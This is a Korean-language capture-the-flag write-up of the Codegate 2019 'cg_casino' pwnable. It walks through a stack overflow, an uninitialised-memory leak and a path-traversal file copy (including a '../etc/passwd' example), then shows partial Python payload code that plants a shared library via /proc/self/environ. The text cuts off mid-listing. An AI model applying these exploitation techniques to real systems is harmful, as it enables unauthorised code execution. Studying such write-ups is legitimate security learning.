+++
title = "Codegate 2019 CTF Quals - cg_casino"
date = "2024-08-01"
description = "Codegate 2019 CTF Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "bof", "/proc/self/environ", "ld_preload", "envp"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/cg_casino'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
### Concept
``` bash
➜  nc 0 6677
$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$  CG CASINO $$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$
1) put voucher
2) merge voucher
3) lotto
4) up down game
5) slot machine
6) exit
> 
```
세 개의 카지노 게임과 `put voucher`와 `merge voucher` 기능이 구현되어있다.

## 0x01. Vulnerability
### Stack overflow
``` c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  char new[48]; // [rsp+30h] [rbp-60h] BYREF
  char old[40]; // [rsp+60h] [rbp-30h] BYREF
  ...
    switch ( choice )
    {
      case 1:
        memset(new, 0, 0x28uLL);
        printf("input voucher : ");
        read_401108((__int64)new);
        len32_alnum_4010A4(new);
        break;
      case 2:
        memset(old, 0, sizeof(old));
        printf("input old voucher : ");
        read_401108((__int64)old);
        xstat_unlink_400F09(new, old);
        break;
```
먼저 `voucher`를 `put`하거나 `merge`하기 위해 `voucher` 이름을 입력받는데, `read_401108()`에서 입력을 받게 된다.
``` c
unsigned __int64 __fastcall read_401108(__int64 a1)
{
  ...
  while ( 1 )
  {
    if ( (unsigned int)read(0, &buf, 1uLL) != 1 )
      exit(-1);
    if ( buf == 10 )
      break;
    index = i++;
    *(_BYTE *)(a1 + index) = buf;
  }
  v1 = i++;
  *(_BYTE *)(v1 + a1) = 0;
  ...
}
```
그런데 입력을 `\n`이 나올 때까지 1바이트씩 끝없이 받기 때문에 stack의 끝까지 overflow가 발생한다.

하지만 `main()`에서 return을 하는 부분 없이 바로 `exit()`을 하기 때문에 rip control은 어려워 보인다.

### Stack leak
동적 분석을 하다가 우연히 얻어걸렸는데, `lotto_4011A7()`에서 초기화되지 않은 데이터의 leak이 가능하다.
``` c
unsigned __int64 lotto_4011A7()
{
  ...
  int number[6]; // [rsp+10h] [rbp-40h]
  int guess[6]; // [rsp+30h] [rbp-20h] BYREF
  ...
  while ( i <= 5 )
  {
    __isoc99_scanf("%u", &guess[i]);
    getchar();
    if ( (unsigned int)guess[i] <= 44 )
      ++i;
    else
      printf("%u : out of range\n", (unsigned int)guess[i]);
  }
  puts("===================");
  ...
}
```
원래는 단순히 0~44 범위의 랜덤 숫자 6개를 생성해서 저장한 후, `guess` 배열에 값을 입력해서 맞추는 게임이다.

그런데 `guess` 값으로 `%u` 형식에 맞지 않는, 가령 `a`가 입력되면 `scanf`가 실패하고 기존에 저장되어있던 `guess`의 값을 출력해준다.
``` bash
GUESS 6 Numbers!
===================
|  |  |  |  |  |  |
===================
a a a a a a
2522534248 : out of range
2522534248 : out of range
2522534248 : out of range
2522534248 : out of range
```

### File copy
사실 취약점이라기보다는 바이너리에 주어진 기능인데, `merge voucher`에서 다음 함수가 호출된다.
``` c
unsigned __int64 __fastcall xstat_unlink_400F09(const char *new, char *old)
{
  ...
  if ( strlen(old) == 32 )
  {
    if ( xstat_4016D0(old, &n_4) == -1 )
    {
      puts("voucher doesn't exist");
    }
    else if ( n_4.st_size <= 4096 )
    {
      fd_old = open(old, 0);
      if ( fd_old != -1 )
      {
        len = read(fd_old, buf, 4096uLL);
        close(fd_old);
        fd_new = open(new, 66, 384LL);
        if ( fd_new != -1 )
        {
          write(fd_new, buf, len);
          close(fd_new);
          unlink(old);
        }
        memset(buf, 0, 0x1000uLL);
      }
    }
    ...
}
```
`put voucher`를 통해서 stack의 `new`에 파일명을 지정해두면, 파일명이 32바이트인 파일을 `/home/cg_casino/voucher/` 디렉토리로 옮길 수 있다.

입력한 내용에 대한 검증이 따로 없으므로 길이 제한은 `../`, `./`를 잘 조합해서 우회할 수 있다.
- ../../../../../../././etc/passwd

## 0x02. Exploit
### File drop
취약점은 이게 끝인데, 문제는 파일을 서버에 올릴 방법이 없다.

어떻게든 파일을 서버에 올린 다음 `merge voucher` 기능을 이용해서 파일을 `/home/cg_casino/voucher/` 경로로 옮긴 후 다음 단계로 넘어가야할 것 같은데...

그러다가 `/proc/self/environ` 파일에서 다음 내용을 발견했다.
``` bash
cg_casino@3197b44a521a:~/voucher$ cat /proc/1203/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=3197b44a52
1aERASER2=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
```
`AAAA`는 `docker-compose.yml` 파일에서 정의된 환경변수 값들인데, 앞부분은 다른 내용으로 바뀐 것을 보니 실행 중 값을 반영하는 것 같았다.

실제로 stack의 끝에 있는 환경변수까지 값을 덮어보니 다음과 같이 `/proc/self/environ` 파일이 변경된 것을 확인할 수 있었다.
``` bash
cg_casino@3197b44a521a:~/voucher$ cat /proc/1241/environ
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
...
```
따라서 이런 식으로 stack의 값을 조작해서 `/proc/self/environ`에 파일의 형태로 남길 수 있다.

### Stack overflow & File copy
`/proc/self/environ`에 libc 데이터를 쓰고 그것을 `/home/cg_casino/voucher`로 가져오기 위한 조건은 총 3개이다.
- main의 new가 `/home/cg_casino/voucher`에 저장할 파일명일 것
- main의 old가 길이가 32이고 `/proc/self/environ` 파일을 가리킬 것
- stack 끝의 환경변수가 저장된 공간에 libc 데이터가 쓰여질 것

따라서 다음과 같이 payload를 구성했다.
``` python
    payload = b"mylib.so\x00"
    payload += b"\x00" * (env - buf - len(payload))
    payload += lib_data
    payload += b"\x00" * (3432 - (len(payload)))
    put_voucher(s, payload)

    merge_voucher(s, b"../../../../../proc/self/environ")
```
한편 이 과정에서 `read_401108()`를 이용해서 입력을 받기 때문에 libc에 `\x0a`가 있으면 데이터가 짤릴 위험이 있다.

실제로도 `\x0a`가 있어서 혹시나 하는 마음에 `\x0b`로 바꿔봤는데 다행히 libc가 잘 작동했다.
``` python
    with open("./mylib.so", "rb") as f:
        lib_data = f.read()
    lib_data = lib_data.replace(b"\x0a", b"\x0b")
```
따라서 위 payload를 추가해주어야 한다.

### Small libc
여기에서 문제가 하나 더 있는데 환경변수 영역도 한도가 있기 때문에 `merge voucher`로 가져올 수 있는 데이터 길이가 제한되어있다.
``` bash
root@3197b44a521a:/home/cg_casino/voucher# ls -al
total 16
drwxrwx-wx 1 root      root      4096 Aug  1 05:24 .
drwxr-xr-x 1 root      root      4096 Jul 31 08:08 ..
-rw